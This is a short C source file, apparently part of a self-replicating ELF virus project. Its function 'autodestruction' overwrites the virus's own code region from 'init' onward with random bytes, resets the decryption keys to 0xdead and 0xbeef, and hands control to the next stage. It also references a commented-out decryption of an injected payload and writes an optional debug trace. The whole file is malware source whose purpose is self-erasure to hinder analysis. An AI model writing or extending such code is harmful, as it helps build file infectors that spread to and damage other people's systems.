#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void autodestruction(struct s_host *host, struct s_keychain *keychain, enum e_context context)
{
//	decrypt_left(keychain, (char *)injection, (void *)autodestruction - (void *)injection);

#if DEBUG
	char function[] = "autodestruction:\t";
	char name[] = "/tmp/trace";
	int trace = _open(name, O_RDWR | O_APPEND, 0000);
	char newline = 0xa;
	char result = context + 48;
	
	if (trace > 0)
	{
		_write(trace, function, _strlen(function));
		_write(trace, &result, 1);
		_write(trace, &newline, 1);
		_write(trace, &newline, 1);
	}

	_close(trace);
#endif

	char *entry;
	const size_t size = (void *)autodestruction - (void *)init;
	char buf[size];

	entry = (char *)init;

	if (_getrandom(buf, size, GRND_NONBLOCK) < 0)
		_bzero(buf, size);

	for (register size_t index = 0; index < size; index++)
		entry[index] = buf[index];

	keychain->key[LEFT] = 0xdead;
	keychain->key[RIGHT] = 0xbeef;

	execution(host, keychain, context);
}
